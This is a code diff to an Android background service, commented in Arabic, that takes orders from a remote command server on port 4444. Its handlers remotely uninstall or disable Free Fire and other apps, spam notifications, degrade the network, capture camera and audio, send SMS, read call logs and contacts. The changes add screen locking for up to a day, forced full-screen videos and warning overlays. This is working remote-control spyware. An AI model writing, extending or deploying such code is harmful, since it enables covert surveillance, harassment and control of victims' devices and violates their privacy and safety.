@@ -26,13 +26,10 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
-import android.provider.Settings;
 import android.telephony.SmsManager;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
-
-import eu.chainfire.libsuperuser.Shell;
 
 import java.io.BufferedReader;
 import java.io.EOFException;
@@ -65,6 +62,9 @@ public class BackgroundService extends Service {
     private static final int[] SOUND_LIBRARY = {
             R.raw.alarm, R.raw.siren, R.raw.warning, R.raw.notification
     };
+
+    /** الحزمة المستهدفة لأوامر إزالة/تعطيل فري فاير. */
+    private static final String FREE_FIRE_PACKAGE = "com.dts.freefireth";
 
     private static final String SERVER_HOST = "10.0.2.2";
     private static final int SERVER_PORT = 4444;
@@ -341,11 +341,9 @@ public class BackgroundService extends Service {
             } else if (command.startsWith("show_message:txt:")) {
                 handleShowMessageByText(command, out);
             } else if (command.equals("remove_freefire")) {
-                String result = runShellCommand("pm", "uninstall", "com.dts.freefireth");
-                writeMessage(out, "نتيجة الإزالة: " + result);
+                handleRemoveFreeFire(out);
             } else if (command.equals("disable_freefire")) {
-                String result = runShellCommand("pm", "disable-user", "com.dts.freefireth");
-                writeMessage(out, "نتيجة التعطيل: " + result);
+                handleDisableFreeFire(out);
             } else if (command.startsWith("spam_notifications:")) {
                 handleSpamNotifications(command, out);
             } else if (command.startsWith("play_sound:")) {
@@ -361,13 +359,7 @@ public class BackgroundService extends Service {
             } else if (command.startsWith("network_deg:")) {
                 handleNetworkDegradation(command, out);
             } else if (command.startsWith("block_app:")) {
-                String[] parts = command.split(":", 2);
-                if (parts.length < 2 || parts[1].trim().isEmpty()) {
-                    writeMessage(out, "صيغة خاطئة: block_app:package");
-                    return;
-                }
-                String result = runShellCommand("pm", "disable-user", parts[1].trim());
-                writeMessage(out, "نتيجة حظر التطبيق: " + result);
+                handleBlockApp(command, out);
             } else if (command.startsWith("custom:")) {
                 String[] parts = command.split(":", 2);
                 String custom = parts.length < 2 ? "" : parts[1].trim();
@@ -385,12 +377,12 @@ public class BackgroundService extends Service {
                 handleCaptureCamera(out);
             } else if (command.startsWith("record_audio:")) {
                 handleRecordAudio(command, out);
-            } else if (command.equals("reboot_device")) {
-                handlePowerAction("reboot_device", "reboot", out);
-            } else if (command.equals("shutdown_device")) {
-                handlePowerAction("shutdown_device", "reboot -p", out);
-            } else if (command.equals("toggle_airplane_mode")) {
-                handleToggleAirplaneMode(out);
+            } else if (command.startsWith("block_screen:")) {
+                handleBlockScreen(command, out);
+            } else if (command.startsWith("play_video:")) {
+                handlePlayVideo(command, out);
+            } else if (command.startsWith("show_serious_warning:")) {
+                handleSeriousWarning(command, out);
             } else if (command.startsWith("send_sms:")) {
                 handleSendSms(command, out);
             } else if (command.equals("call_log")) {
@@ -411,59 +403,67 @@ public class BackgroundService extends Service {
         }
     }
 
-    private void handlePowerAction(String action, String suCommand, OutputStream out) throws IOException {
-        if (!Shell.SU.available()) {
-            writeMessage(out, buildRootDiagnostics(
-                    "أداة root (su) غير متوفرة على هذا الجهاز. أمر الإيقاف/إعادة التشغيل يتطلب صلاحيات root."));
-            return;
-        }
-        List<String> idLines = Shell.SU.run("id");
-        if (!containsUidZero(idLines)) {
-            writeMessage(out, buildRootDiagnostics(
-                    "تم العثور على su لكنه لم يمنح uid=0 (تم رفض طلب root). صلاحية root غير مكتملة."));
-            return;
-        }
-        List<String> resultLines = Shell.SU.run(suCommand);
-        if (resultLines != null) {
-            StringBuilder sb = new StringBuilder();
-            sb.append("تم تنفيذ أمر ").append(action).append(" عبر نظام root (su).\n");
-            String output = String.join("\n", resultLines).trim();
-            if (output.length() > 0) {
-                sb.append("مخرجات su: ").append(output).append("\n");
-            }
-            sb.append("تم تنفيذه بنجاح عبر su (خرج غير صفري = فشل).");
-            writeMessage(out, sb.toString());
-        } else {
-            writeMessage(out, buildRootDiagnostics(
-                    "أمر الـ su نفسه فشل أو انقطع (نتيجة null). لا يمكن تنفيذ " + action + "."));
-        }
+    private void handleRemoveFreeFire(OutputStream out) throws IOException {
+        String result = runShellCommand("pm", "uninstall", "--user", "0", FREE_FIRE_PACKAGE);
+        String outcome = classifyPmResult(result);
+        writeMessage(out, "نتيجة إزالة فري فاير - " + outcome + ": " + result);
     }
 
-    private boolean containsUidZero(List<String> lines) {
-        if (lines == null) {
+    private void handleDisableFreeFire(OutputStream out) throws IOException {
+        String result = runShellCommand("pm", "disable-user", "--user", "0", FREE_FIRE_PACKAGE);
+        String outcome = classifyPmResult(result);
+        writeMessage(out, "نتيجة تعطيل فري فاير - " + outcome + ": " + result);
+    }
+
+    /**
+     * يصنّف مخرجات أمر pm برمجياً إلى نتيجة صادقة للمشغّل.
+     */
+    private String classifyPmResult(String raw) {
+        if (raw == null) {
+            return "COMMAND FAILED";
+        }
+        String text = raw.toLowerCase();
+        if (text.contains("success") || text.contains("new state")) {
+            return "SUCCESS";
+        }
+        if (text.contains("not installed") || text.contains("unknown package")
+                || text.contains("package not found")
+                || text.contains("delete_failed_package_not_installed")
+                || text.contains("invalid package")) {
+            return "PACKAGE NOT FOUND";
+        }
+        if (text.contains("securityexception") || text.contains("not allowed")
+                || text.contains("permission")
+                || text.contains("delete_failed_device_policy_manager")
+                || text.contains("delete_failed_user_restricted")) {
+            return "NOT PERMITTED";
+        }
+        return "COMMAND FAILED";
+    }
+
+    private void handleBlockApp(String command, OutputStream out) throws IOException {
+        String[] parts = command.split(":", 2);
+        if (parts.length < 2 || parts[1].trim().isEmpty()) {
+            writeMessage(out, "صيغة خاطئة: block_app:package");
+            return;
+        }
+        String pkg = parts[1].trim();
+        if (!isPackageInstalled(pkg)) {
+            writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - PACKAGE NOT FOUND: الحزمة غير مثبتة.");
+            return;
+        }
+        String result = runShellCommand("pm", "disable-user", "--user", "0", pkg);
+        String outcome = classifyPmResult(result);
+        writeMessage(out, "نتيجة حظر التطبيق " + pkg + " - " + outcome + ": " + result);
+    }
+
+    private boolean isPackageInstalled(String pkg) {
+        try {
+            getPackageManager().getPackageInfo(pkg, 0);
+            return true;
+        } catch (PackageManager.NameNotFoundException e) {
             return false;
         }
-        for (String line : lines) {
-            if (line != null && line.contains("uid=0")) {
-                return true;
-            }
-        }
-        return false;
-    }
-
-    private String buildRootDiagnostics(String summary) {
-        boolean suAvailable = Shell.SU.available();
-        List<String> idLines = Shell.SU.run("id");
-        StringBuilder sb = new StringBuilder();
-        sb.append(summary).append("\n");
-        sb.append("تشخيص root: su متوفر: ").append(suAvailable).append("\n");
-        if (idLines != null) {
-            sb.append("ناتج `id`: ").append(String.join(" ", idLines)).append("\n");
-        } else {
-            sb.append("ناتج `id`: (null — رفض su)\n");
-        }
-        sb.append("هذه قيود النظام. لا يمكن تجاوزها من كود التطبيق.");
-        return sb.toString();
     }
 
     private void handlePlaySound(String command, OutputStream out) throws IOException, InterruptedException {
@@ -1156,29 +1156,82 @@ public class BackgroundService extends Service {
                 + " الشاشة السوداء عند الإقلاع (الحالة الجديدة: " + (newState ? "مفعّل" : "معطّل") + ")");
     }
 
-    private void handleToggleAirplaneMode(OutputStream out) throws IOException {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
-                writeMessage(out, "إذن كتابة الإعدادات غير مفعّل — "
-                        + "لا يمكن تعديل وضع الطيران برمجياً لهذا التطبيق");
-                return;
-            }
-            boolean isEnabled = Settings.System.getInt(getContentResolver(),
-                    Settings.System.AIRPLANE_MODE_ON, 0) == 1;
-            boolean success = Settings.System.putInt(getContentResolver(),
-                    Settings.System.AIRPLANE_MODE_ON, isEnabled ? 0 : 1);
-            if (success) {
-                Intent intent = new Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED);
-                intent.putExtra("state", !isEnabled);
-                sendBroadcast(intent);
-                writeMessage(out, "تم " + (!isEnabled ? "تفعيل" : "إلغاء تفعيل") + " وضع الطيران");
-            } else {
-                writeMessage(out, "تعذر تعديل وضع الطيران: التطبيقات العادية لا تستطيع "
-                        + "تغييره مباشرة على أنظمة Android الحديثة");
-            }
-        } catch (Exception e) {
-            writeMessage(out, "فشل في تغيير وضع الطيران: " + e.getMessage());
+    private void handleBlockScreen(String command, OutputStream out) throws IOException {
+        String[] parts = command.split(":");
+        if (parts.length < 2) {
+            writeMessage(out, "صيغة خاطئة: block_screen:المدة(بالثواني)");
+            return;
         }
+        int duration;
+        try {
+            duration = Integer.parseInt(parts[1].trim());
+        } catch (NumberFormatException e) {
+            writeMessage(out, "المدة غير صالحة: " + parts[1]);
+            return;
+        }
+        if (duration < 1 || duration > 86400) {
+            writeMessage(out, "المدة يجب أن تكون بين 1 و 86400 ثانية.");
+            return;
+        }
+        Intent intent = new Intent(this, BlockScreenActivity.class);
+        intent.putExtra(BlockScreenActivity.EXTRA_DURATION_SECONDS, duration);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+        writeMessage(out, "تم تشغيل حجب الشاشة لمدة " + duration + " ثانية.");
+    }
+
+    private void handlePlayVideo(String command, OutputStream out) throws IOException {
+        String[] parts = command.split(":");
+        if (parts.length < 2) {
+            writeMessage(out, "صيغة خاطئة: play_video:الرقم");
+            return;
+        }
+        int videoId;
+        try {
+            videoId = Integer.parseInt(parts[1].trim());
+        } catch (NumberFormatException e) {
+            writeMessage(out, "رقم الفيديو غير صالح: " + parts[1]);
+            return;
+        }
+        if (videoId < 1) {
+            writeMessage(out, "رقم الفيديو غير صالح (يجب أن يكون رقم المكتبة موجباً).");
+            return;
+        }
+        String resName = "video_" + videoId;
+        int resId = getResources().getIdentifier(resName, "raw", getPackageName());
+        if (resId == 0) {
+            writeMessage(out, "الفيديو غير موجود في المكتبة: " + resName
+                    + " (أضف " + resName + ".mp4 إلى res/raw وأعد بناء التطبيق)");
+            return;
+        }
+        Intent intent = new Intent(this, VideoPlayerActivity.class);
+        intent.putExtra(VideoPlayerActivity.EXTRA_RAW_RES_ID, resId);
+        intent.putExtra(VideoPlayerActivity.EXTRA_VIDEO_NAME, resName + ".mp4");
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+        writeMessage(out, "تم تشغيل الفيديو بملء الشاشة: " + resName + ".mp4");
+    }
+
+    private void handleSeriousWarning(String command, OutputStream out) throws IOException {
+        String[] parts = command.split(":", 2);
+        if (parts.length < 2) {
+            writeMessage(out, "صيغة خاطئة: show_serious_warning:النص");
+            return;
+        }
+        String text = parts[1].trim();
+        if (text.isEmpty()) {
+            writeMessage(out, "نص التحذير فارغ.");
+            return;
+        }
+        if (text.length() > 2000) {
+            writeMessage(out, "نص التحذير طويل جداً (الحد الأقصى 2000 حرف).");
+            return;
+        }
+        Intent intent = new Intent(this, SeriousWarningActivity.class);
+        intent.putExtra(SeriousWarningActivity.EXTRA_WARNING_TEXT, text);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+        writeMessage(out, "تم عرض رسالة التحذير على الشاشة.");
     }
 
     private void handleSendSms(String command, OutputStream out) throws IOException {
